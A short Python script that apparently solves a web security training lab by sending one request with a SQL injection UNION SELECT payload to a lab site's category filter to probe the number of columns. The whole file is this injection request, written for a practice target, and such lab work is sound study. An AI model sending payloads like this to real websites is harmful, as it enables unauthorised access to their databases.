import requests

URL = "https://0a1d003f04b4983b80fa3fe700e5006c.web-security-academy.net/"

requests.get(URL + "filter?category=Accessories%27+UNION+SELECT+NULL,NULL,NULL--")